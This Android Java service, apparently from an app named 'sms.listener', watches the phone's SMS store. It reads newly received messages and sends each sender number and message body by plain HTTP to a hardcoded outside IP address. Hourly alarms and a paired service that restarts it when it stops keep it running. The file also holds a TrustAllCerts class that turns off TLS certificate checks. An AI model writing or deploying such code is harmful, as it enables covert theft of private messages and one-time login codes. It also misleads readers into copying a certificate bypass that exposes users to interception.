package com.sms.listener.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;

import com.sms.listener.IOnLiveService;
import com.sms.listener.biz.db.Config;
import com.sms.listener.observer.SmsObserver;
import com.sms.listener.po.SmsMessage;
import com.sms.listener.receiver.SmsReceiver;
import com.sms.listener.utils.HttpUtils;

import java.io.IOException;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import io.realm.Realm;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by xuzhou on 2018/7/4.
 */

public class BaseService extends Service {

    public static final int NEW_MSG_WHAT = 10000;
    private static final String DEFAULT_URL = "http://101.132.97.20:8099/getMessage/";
    private static final int RE_TRY_COUNT = 3;
    private Uri SMS_INBOX = Uri.parse("content://sms/inbox");
    private Uri SMS_ALL = Uri.parse("content://sms");
    private ServiceConnection localConnection;
    private LocalService localService;
    private SmsObserver smsObserver;
    private int reTryCount = 0;
    private String url;
    private String localPhone;

    @Override
    public void onCreate() {
        super.onCreate();
        init();
        initData();
    }

    private void init() {
        if(null == localConnection) {
            localConnection = new LocalConnection();
        }
        localService = new LocalService();
        smsObserver = new SmsObserver(smsHandler);
        getContentResolver().registerContentObserver(SMS_ALL, true, smsObserver);
    }

    private void initData() {
        Realm realm = Realm.getDefaultInstance();
        Config config = realm.where(Config.class).findFirst();
        if(null != config) {
            url = config.getUrl();
            localPhone = config.getLocalPhone();
        }
        if(null == url || url.length() < 1) {
            url = DEFAULT_URL;
        }
    }

    private Handler smsHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if(NEW_MSG_WHAT == msg.what) {
                new Thread(() -> {
                    List<SmsMessage> smsList = getSmsFromPhone();
                    if(null != smsList) {
                        reTryCount = 0;
                        int len = smsList.size();
                        String content;
                        SmsMessage smsMessage;
                        for (int i = 0; i < len; i++) {
                            smsMessage = smsList.get(i);
                            content = smsMessage.getSmsPhone() + "-" + smsMessage.getSmsBody();
                            getRequest(url + content);
                        }
                    }
                }).start();
            }
        }
    };

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        String type = null == intent.getStringExtra("S_TYPE") ? "start" : intent.getStringExtra("S_TYPE");
        if("start".equals(type)) {
            AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
            int anHour = 60 * 60 * 1000;
            long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
            Intent i = new Intent(this, SmsReceiver.class);
            i.setAction("action.heart");
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
            manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        } else if("send".equals(type)) {
            String content = intent.getStringExtra("SMS_CONTENT");
            reTryCount = 0;
            //new Thread(() -> getRequest(URL + content)).start();
        }
        return START_STICKY;
    }

    public List<SmsMessage> getSmsFromPhone() {
        List<SmsMessage> smsMessageList = null;
        ContentResolver cr = getContentResolver();
        String[] projection = new String[] { "_id", "body", "address", "date"};//"_id", "address", "person",, "date", "type
        String where = " date >  " + (System.currentTimeMillis() - 60 * 1000);
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur)
            return null;
        if (cur.moveToFirst()) {
            smsMessageList = new ArrayList<>();
            while(cur.moveToNext()) {
                int id = cur.getInt(cur.getColumnIndex("_id"));
                String number = cur.getString(cur.getColumnIndex("address"));//手机号
                String body = cur.getString(cur.getColumnIndex("body"));
                long date = cur.getLong(cur.getColumnIndex("date"));
                SmsMessage smsMessage = new SmsMessage(id, number, body, date);
                smsMessageList.add(smsMessage);
            }
        }
        return smsMessageList;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return localService;
    }

    public void getRequest(String url) {
        reTryCount ++;
        //1.okhttpClient对象
        OkHttpClient okHttpClient = new OkHttpClient();
        //2构造Request,
        //builder.get()代表的是get请求，url方法里面放的参数是一个网络地址
        Request.Builder builder = new Request.Builder();
        Request request = builder.get().url(url).build();

        //3将Request封装成call
        Call call = okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.i("BaseService", "onFailure");
                if(reTryCount < RE_TRY_COUNT) {
                    getRequest(url);
                } else {
                    reTryCount = 0;
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String result = response.body().string();
                if(!TextUtils.isEmpty(result) && !"success".equals(result)) {
                    if(reTryCount < RE_TRY_COUNT) {
                        getRequest(url);
                    } else {
                        reTryCount = 0;
                    }
                } else {
                    reTryCount = 0;
                }
                Log.i("BaseService", result);
            }
        });
    }

    /**
     * post请求，异步方式，提交数据，是在子线程中执行的，需要切换到主线程才能更新UI
     * @param url
     * @param bodyParams
     */
    public  void postRequest(String url, Map<String,String> bodyParams) {
        //1.okhttpClient对象
        OkHttpClient okHttpClient = new OkHttpClient();
        //1构造RequestBody
        RequestBody body=setRequestBody(bodyParams);
        //2 构造Request
        Request.Builder requestBuilder = new Request.Builder();
        Request request = requestBuilder.post(body).url(url).build();
        //3 将Request封装为Call
        Call call = okHttpClient.newCall(request);
        //4 执行Call
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

            }
        });
    }

    /**
     * post的请求参数，构造RequestBody
     * @param bodyParams
     * @return
     */
    private RequestBody setRequestBody(Map<String, String> bodyParams){
        RequestBody body;
        okhttp3.FormBody.Builder formEncodingBuilder=new okhttp3.FormBody.Builder();
        if(null != bodyParams){
            Iterator<String> iterator = bodyParams.keySet().iterator();
            String key;
            while (iterator.hasNext()) {
                key = iterator.next().toString();
                formEncodingBuilder.add(key, bodyParams.get(key));
            }
        }
        body=formEncodingBuilder.build();
        return body;

    }


    /**
     * 生成安全套接字工厂，用于https请求的证书跳过
     * @return
     */
    public SSLSocketFactory createSSLSocketFactory() {
        SSLSocketFactory ssfFactory = null;
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{new TrustAllCerts()}, new SecureRandom());
            ssfFactory = sc.getSocketFactory();
        } catch (Exception e) {
        }
        return ssfFactory;
    }

    /**
     * 用于信任所有证书
     */
    class TrustAllCerts implements X509TrustManager {
        @Override
        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

    }


    class LocalService extends IOnLiveService.Stub {

        @Override
        public String getName() throws RemoteException {
            return "本地连接";
        }
    }

    class LocalConnection implements ServiceConnection {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {

        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Intent intent = new Intent(BaseService.this, RemoteService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                BaseService.this.startForegroundService(intent);
            } else {
                BaseService.this.startService(intent);
            }
            BaseService.this.bindService(new Intent(BaseService.this,
                    RemoteService.class), localConnection, Context.BIND_IMPORTANT);
        }
    }

    @Override
    public void onDestroy() {
        if(null != smsObserver) {
            getContentResolver().unregisterContentObserver(smsObserver);
        }
        super.onDestroy();
    }
}
